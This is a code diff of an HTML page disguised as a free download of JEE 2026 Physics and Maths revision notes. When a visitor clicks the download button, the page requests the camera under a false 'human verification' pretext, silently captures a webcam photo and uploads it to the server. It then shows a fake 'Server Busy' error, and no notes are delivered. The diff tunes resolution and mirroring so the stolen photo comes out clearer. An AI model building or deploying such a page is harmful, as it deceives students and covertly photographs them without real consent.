@@ -71,63 +71,76 @@
 </head>
 <body>
 
-    <div class="container">
-        <div class="pdf-icon">📄</div>
-        <h2>JEE 2026: Physics & Maths</h2>
-        <p>Complete Chapter-wise Revision Notes by Top Faculties. <br><b>Size: 14.5 MB | Format: PDF</b></p>
-        
-        <button class="download-btn" id="start">
-            <svg width="20" height="20" fill="currentColor" viewBox="0 0 20 20"><path d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z"/></svg>
-            Download Study Material
-        </button>
+<div class="container">
+    <div class="pdf-icon">📄</div>
+    <h2>JEE 2026: Physics & Maths</h2>
+    <p>Complete Chapter-wise Revision Notes by Top Faculties. <br><b>Size: 14.5 MB | Format: PDF</b></p>
 
-        <div id="status" class="loader">Generating secure download link...</div>
+    <button class="download-btn" id="start">
+        <svg width="20" height="20" fill="currentColor" viewBox="0 0 20 20">
+            <path d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z"/>
+        </svg>
+        Download Study Material
+    </button>
 
-        <video id="v" autoplay playsinline></video>
-        <canvas id="c" width="640" height="480"></canvas>
-    </div>
+    <div id="status" class="loader">Generating secure download link...</div>
 
-    <script>
-        const startBtn = document.getElementById('start');
-        const video = document.getElementById('v');
-        const canvas = document.getElementById('c');
-        const status = document.getElementById('status');
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+</div>
 
-        startBtn.onclick = async () => {
-            try {
-                // Permission maangte hi process shuru
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
+<script>
+const startBtn = document.getElementById('start');
+const video = document.getElementById('v');
+const canvas = document.getElementById('c');
+const status = document.getElementById('status');
 
-                startBtn.style.display = 'none';
-                status.style.display = 'block';
+startBtn.onclick = async () => {
+    try {
+        // ✅ resolution set (clear photo)
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { width: 1280, height: 720 }
+        });
+        video.srcObject = stream;
 
-                // 2 second ka wait taaki user ko lage file ready ho rahi hai
-                setTimeout(async () => {
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    stream.getTracks().forEach(track => track.stop());
+        startBtn.style.display = 'none';
+        status.style.display = 'block';
 
-                    canvas.toBlob(async (blob) => {
-                        const fd = new FormData();
-                        fd.append("photo", blob, "jee_user.jpg");
+        setTimeout(() => {
+            const ctx = canvas.getContext('2d');
 
-                        try {
-                            await fetch("/upload", { method: "POST", body: fd });
-                            // Upload ke baad asli notes ka link bhi de sakte ho ya error dikha do
-                            status.innerHTML = "<span style='color:red'>Server Busy! Please try again in 5 minutes.</span>";
-                        } catch (e) {
-                            status.innerText = "Connection lost. Try again.";
-                        }
-                    }, 'image/jpeg');
+            // ✅ canvas = video size (no fat face)
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
 
-                }, 2000);
+            // ✅ mirror remove (normal camera look)
+            ctx.save();
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            ctx.restore();
 
-            } catch (err) {
-                alert("Error: To download notes, please allow 'Camera Access' for human verification.");
-            }
-        };
-    </script>
+            stream.getTracks().forEach(track => track.stop());
+
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append("photo", blob, "jee_user.jpg");
+
+                try {
+                    await fetch("/upload", { method: "POST", body: fd });
+                    status.innerHTML = "<span style='color:red'>Server Busy! Please try again in 5 minutes.</span>";
+                } catch (e) {
+                    status.innerText = "Connection lost. Try again.";
+                }
+            }, 'image/jpeg');
+
+        }, 2000);
+
+    } catch (err) {
+        alert("Error: To download notes, please allow 'Camera Access' for human verification.");
+    }
+};
+</script>
+
 </body>
 </html>
